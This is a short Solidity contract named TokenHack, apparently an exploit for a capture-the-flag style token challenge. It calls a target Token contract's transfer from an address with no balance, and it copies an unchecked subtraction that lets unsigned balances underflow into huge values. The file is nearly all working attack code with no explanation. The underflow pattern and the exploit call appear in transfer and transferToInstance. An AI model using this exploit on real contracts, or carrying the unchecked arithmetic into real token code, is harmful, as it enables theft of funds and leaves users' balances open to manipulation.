// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Token.sol';

contract TokenHack {

  mapping(address => uint) balances;
  uint public totalSupply;
  Token public tokenInstance;

  

  constructor(uint _initialSupply, address tokenAddr) public {
    balances[msg.sender] = totalSupply = _initialSupply;
    tokenInstance = Token(tokenAddr);
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];

  }

  function transferToInstance(address _to) public {
      tokenInstance.transfer(_to, 1);
  }
}
